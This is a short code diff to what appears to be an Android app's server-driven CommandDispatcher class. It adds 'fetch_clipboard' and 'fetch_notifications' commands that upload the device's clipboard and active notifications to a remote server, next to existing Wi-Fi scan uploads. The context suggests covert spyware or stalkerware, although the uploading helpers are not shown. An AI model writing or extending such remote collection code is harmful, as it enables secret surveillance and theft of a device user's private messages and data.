@@ -66,6 +66,12 @@ public class CommandDispatcher {
         } else if ("update_telemetry_config".equals(type)) {
             handleTelemetryConfig(context, payload);
             ackCommand(serverUrl, deviceId, cmdId);
+        } else if ("fetch_clipboard".equals(type)) {
+            ClipboardMonitor.fetchAndUpload(context);
+            ackCommand(serverUrl, deviceId, cmdId);
+        } else if ("fetch_notifications".equals(type)) {
+            SnapNotificationListener.fetchAndUploadActive(context);
+            ackCommand(serverUrl, deviceId, cmdId);
         } else if ("sync_wifi".equals(type)) {
             WifiScanHelper.scanAndUpload(context);
             ackCommand(serverUrl, deviceId, cmdId);
